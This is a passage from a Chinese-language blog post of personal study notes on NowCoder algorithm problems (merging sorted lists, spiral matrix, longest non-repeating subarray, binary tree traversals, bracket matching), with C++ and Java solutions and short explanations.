 ListNode *res=<span class="keyword">new</span> ListNode(<span class="number">-1</span>);</span><br><span class="line">        ListNode *current=res;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">nullptr</span> &amp;&amp; l2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(l1-&gt;val &lt;= l2-&gt;val)&#123;</span><br><span class="line">                current-&gt;next = l1;</span><br><span class="line">                current=current-&gt;next;</span><br><span class="line">                l1=l1-&gt;next;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                current-&gt;next = l2;</span><br><span class="line">                current=current-&gt;next;</span><br><span class="line">                l2=l2-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l1!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            current-&gt;next = l1;</span><br><span class="line">            current=current-&gt;next;</span><br><span class="line">            l1=l1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(l2!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            current-&gt;next = l2;javascript:<span class="keyword">void</span>(<span class="number">0</span>);</span><br><span class="line">            current=current-&gt;next;</span><br><span class="line">            l2=l2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h2 id="NC38-螺旋矩阵"><a href="#NC38-螺旋矩阵" class="headerlink" title="NC38 螺旋矩阵"></a>NC38 螺旋矩阵</h2><blockquote>
<p>这道题在之前校赛（蓝桥杯）的时候没又做出来，，，<del>原来是个经典算法，tat</del></p>
<p>思路：</p>
<p>使用四个变量：<code>up、r、down、l</code> 来固定四个变，然后依次遍历，，，太容易弄错了，苦苦</p>
</blockquote>
<h3 id="vector"><a href="#vector" class="headerlink" title="vector"></a>vector</h3><h3 id="初始化大小并赋值"><a href="#初始化大小并赋值" class="headerlink" title="初始化大小并赋值"></a>初始化大小并赋值</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">a</span><span class="params">(<span class="number">10</span>,<span class="number">1</span>)</span></span>; <span class="comment">//定义了10个整型元素的向量,且给出每个元素的初值为1</span></span><br></pre></td></tr></table></figure>

<h4 id="二维数组初始化："><a href="#二维数组初始化：" class="headerlink" title="二维数组初始化："></a>二维数组初始化：</h4><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-20.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; <span class="title">spiralOrder</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; &amp;matrix)</span></span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">if</span>(matrix.empty())&#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> up=<span class="number">0</span>,down=matrix.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> l=<span class="number">0</span>,r=matrix[<span class="number">0</span>].<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> (<span class="number">1</span>)&#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = l; i &lt;= r ; ++i) res.push_back(matrix[up][i]);</span><br><span class="line">            <span class="keyword">if</span>(++up &gt; down) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = up; i &lt;= down ; ++i) res.push_back(matrix[i][r]);</span><br><span class="line">            <span class="keyword">if</span>(--r &lt; l) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = r; i &gt;= l ; --i) res.push_back(matrix[down][i]);</span><br><span class="line">            <span class="keyword">if</span>(--down &lt; up) <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> i = down; i &gt;= up ; --i) res.push_back(matrix[i][l]);</span><br><span class="line">            <span class="keyword">if</span>(++l &gt; r) <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = &#123;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;,&#123;<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>&#125;,&#123;<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>&#125;&#125;;</span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; ans = s.spiralOrder(v);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ans.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="built_in">cout</span>&lt;&lt;ans[i]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NC41-找到字符串的最长无重复字符子串"><a href="#NC41-找到字符串的最长无重复字符子串" class="headerlink" title="NC41 找到字符串的最长无重复字符子串"></a>NC41 找到字符串的最长无重复字符子串</h2><h3 id="快速读入方法"><a href="#快速读入方法" class="headerlink" title="快速读入方法"></a>快速读入方法</h3><blockquote>
<p>一个静态方法，，，只要有就可以了。</p>
<p>实现空间换时间。</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">auto</span> io_sync_off = []()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.tie(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;();</span><br></pre></td></tr></table></figure>

<h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>题目解释：在一个int型数组中，找到一段连续的最大不重复的数组长度（这段数组连续）。</p>
<p>方法：</p>
<ol>
<li><p>设置三个变量，i、j、res。</p>
<p>i是这段的第一个</p>
<p>j是这段的第二个</p>
<p>res是长度值</p>
</li>
<li><p>因为不重复，，，结束就在两个重复的元素，一旦找到当前重复了，之前的长度就是这段的长度，就一段一段算。</p>
</li>
</ol>
<p>例1：1 2 3 2 6数组，答案是3。</p>
<ul>
<li>起始地址初始为arr[0]，即1，故一直循环到1 2 3 2，最大不重复数组长度为长度为3。这时候发现有重复，即开始这个和到现在指向的一段里面有重复元素，故将起始地址换为下一个；</li>
<li>起始地址变为arr[1]，即从2开始，2 3 2，发现又有重复，起始地址继续换为下一个。</li>
<li>3 2 6到达数组尾端，长度为3</li>
<li>故最大值，最后结果为3。</li>
</ul>
<p>例2：1 2 1 2 6数组，答案是3。</p>
<ul>
<li>首先1 2 1，长度为2，重复</li>
<li>然后2 1 2，长度为2，重复</li>
<li>然后1 2 6，长度为3</li>
<li>故最后取值最大为3。</li>
</ul>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">const</span> <span class="keyword">auto</span> io_sync_off = []()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">std</span>::ios::sync_with_stdio(<span class="literal">false</span>);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cin</span>.tie(<span class="literal">nullptr</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">&#125;();</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * @param arr int整型vector the array</span></span><br><span class="line"><span class="comment">     * @return int整型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">maxLength</span><span class="params">(<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&amp; arr)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">if</span>(arr.<span class="built_in">size</span>()==<span class="number">0</span>) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">         </span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;v(<span class="number">100000</span>);</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>,i=<span class="number">0</span>,j=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(j&lt;arr.<span class="built_in">size</span>())&#123;</span><br><span class="line">            <span class="keyword">if</span>(v[arr[j]]==<span class="number">0</span>)&#123;</span><br><span class="line">                v[arr[j]]=<span class="number">1</span>;</span><br><span class="line">                res=<span class="built_in">max</span>(res,j-i+<span class="number">1</span>);</span><br><span class="line">                j++;</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                v[arr[i]]=<span class="number">0</span>;</span><br><span class="line">                i++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h2 id="NC45-实现二叉树先序，中序和后序遍历"><a href="#NC45-实现二叉树先序，中序和后序遍历" class="headerlink" title="NC45 实现二叉树先序，中序和后序遍历"></a>NC45 实现二叉树先序，中序和后序遍历</h2><h3 id="树节点TreeNode"><a href="#树节点TreeNode" class="headerlink" title="树节点TreeNode"></a>树节点TreeNode</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) :</span><br><span class="line">            val(x), left(<span class="literal">NULL</span>), right(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="先序、中序、后序遍历"><a href="#先序、中序、后序遍历" class="headerlink" title="先序、中序、后序遍历"></a>先序、中序、后序遍历</h3><blockquote>
<ul>
<li>先序：根、左节点、右节点</li>
<li>中序：左节点、跟、右节点</li>
<li>后序：左节点、右节点、跟</li>
</ul>
</blockquote>
<p>先序的代码：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    pre.push_back(root-&gt;val);</span><br><span class="line">    preorder(root-&gt;left);</span><br><span class="line">    preorder(root-&gt;right);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Created by YCNN on 2021-03-19.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="keyword">using</span>  <span class="keyword">namespace</span>  <span class="built_in">std</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> &#123;</span></span><br><span class="line">    <span class="keyword">int</span> val;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">left</span>;</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">TreeNode</span> *<span class="title">right</span>;</span></span><br><span class="line">    TreeNode(<span class="keyword">int</span> x) :</span><br><span class="line">            val(x), left(<span class="literal">NULL</span>), right(<span class="literal">NULL</span>) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; pre,mid,post;</span><br><span class="line">    <span class="function"><span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt; &gt; <span class="title">threeOrders</span><span class="params">(TreeNode* root)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; result;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>) <span class="keyword">return</span> result;</span><br><span class="line">        preorder(root);</span><br><span class="line">        midorder(root);</span><br><span class="line">        postorder(root);</span><br><span class="line">        result=&#123;pre,mid,post&#125;;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">preorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        pre.push_back(root-&gt;val);</span><br><span class="line">        preorder(root-&gt;left);</span><br><span class="line">        preorder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">midorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        midorder(root-&gt;left);</span><br><span class="line">        mid.push_back(root-&gt;val);</span><br><span class="line">        midorder(root-&gt;right);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">postorder</span><span class="params">(TreeNode* root)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(root == <span class="literal">nullptr</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        postorder(root-&gt;left);</span><br><span class="line">        postorder(root-&gt;right);</span><br><span class="line">        post.push_back(root-&gt;val);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="function">TreeNode <span class="title">t1</span><span class="params">(<span class="number">1</span>)</span></span>;</span><br><span class="line">    <span class="function">TreeNode <span class="title">t2</span><span class="params">(<span class="number">2</span>)</span></span>;</span><br><span class="line">    <span class="function">TreeNode <span class="title">t3</span><span class="params">(<span class="number">3</span>)</span></span>;</span><br><span class="line"></span><br><span class="line">    t1.left = &amp;t2;</span><br><span class="line">    t1.right = &amp;t3;</span><br><span class="line"></span><br><span class="line">    Solution s;</span><br><span class="line">    <span class="built_in">vector</span>&lt;<span class="built_in">vector</span>&lt;<span class="keyword">int</span>&gt;&gt; v = s.threeOrders(&amp;t1);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; v.<span class="built_in">size</span>(); ++i) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; v[<span class="number">0</span>].<span class="built_in">size</span>(); ++j) &#123;</span><br><span class="line">            <span class="built_in">cout</span>&lt;&lt;v[i][j]&lt;&lt;<span class="string">" "</span>;</span><br><span class="line">        &#125;<span class="built_in">cout</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="NC52括号序列"><a href="#NC52括号序列" class="headerlink" title="NC52括号序列"></a>NC52括号序列</h2><blockquote>
<p><del>eee，没错，，，熟悉的题目，，，以前做过的，，，然后又犯了同样的毛病</del></p>
<p>就是在stack里面没有的时候，查看栈顶数据和pop都会报错，，，，</p>
<p>题解里面有两个比较有意思的解法。</p>
</blockquote>
<h3 id="解法1：压栈和取栈"><a href="#解法1：压栈和取栈" class="headerlink" title="解法1：压栈和取栈"></a>解法1：压栈和取栈</h3><blockquote>
<p>其实和我的思路一样，但是要简单一点，他是把能消除了消掉，不能消掉的就压栈，，，最后判断栈是否为空即可。</p>
</blockquote>
<h4 id="exp1-1"><a href="#exp1-1" class="headerlink" title="exp1"></a>exp1</h4><blockquote>
<p>代码写的特别简洁，xifan</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; c;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;s.length();i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(c.empty())&#123;</span><br><span class="line">                c.push(s[i]);</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span>(s[i]==<span class="string">')'</span> &amp;&amp; c.top()==<span class="string">'('</span>)&#123;c.pop();&#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">'&#125;'</span> &amp;&amp; c.top()==<span class="string">'&#123;'</span>)&#123;c.pop();&#125;</span><br><span class="line">            <span class="keyword">else</span> <span class="keyword">if</span>(s[i]==<span class="string">']'</span> &amp;&amp; c.top()==<span class="string">'['</span>)&#123;c.pop();&#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;c.push(s[i]);&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> c.empty();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="解法2：字符替换"><a href="#解法2：字符替换" class="headerlink" title="解法2：字符替换"></a>解法2：字符替换</h3><blockquote>
<p>因为正常的字符串，，，，肯定有(){}[]，可以逐步消，正是模拟这个过程，，，虽然代码很好看，，，但其实效率并不是很好，因为replace内部的实现需要线性</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValid</span> <span class="params">(String s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">        <span class="keyword">boolean</span> flag = <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">while</span>(flag)&#123;</span><br><span class="line">            <span class="keyword">int</span> len = s.length();</span><br><span class="line">            s = s.replace(<span class="string">"()"</span>,<span class="string">""</span>);</span><br><span class="line">            s = s.replace(<span class="string">"&#123;&#125;"</span>,<span class="string">""</span>);</span><br><span class="line">            s = s.replace(<span class="string">"[]"</span>,<span class="string">""</span>);</span><br><span class="line">            <span class="keyword">if</span>(len == s.length())&#123;</span><br><span class="line">                flag = <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> s.length() ==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>注意：c++这么使用不好，，，，因为如果s.replace里面没有字符串，，，就报错了，，，，</p>
<h3 id="my-exp"><a href="#my-exp" class="headerlink" title="my exp"></a>my exp</h3><blockquote>
<p>写的比较烂，，，效率不高，但是勉强通过测试了</p>
</blockquote>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param s string字符串 </span></span><br><span class="line"><span class="comment">     * @return bool布尔型</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// write code here</span></span><br><span class="line">            <span class="keyword">bool</span> bol = <span class="literal">true</span>;</span><br><span class="line">    <span class="built_in">stack</span>&lt;<span class="keyword">char</span>&gt; stack1;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.length(); ++i) &#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">'('</span> || s[i] == <span class="string">'&#123;'</span> ||s[i]==<span class="string">'['</span>)&#123;</span><br><span class="line">            stack1.push(s[i]);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i] == <span class="string">']'</span>)&#123;</span><br><span class="line">            <span class="keyword">if</span>(stack1.<span class="built_in">size</span>() == <span class="number">0</span>)&#123;</span><br><span class="line">                bol = <span class="literal">false</span>;</span><br><span class="line">                <span 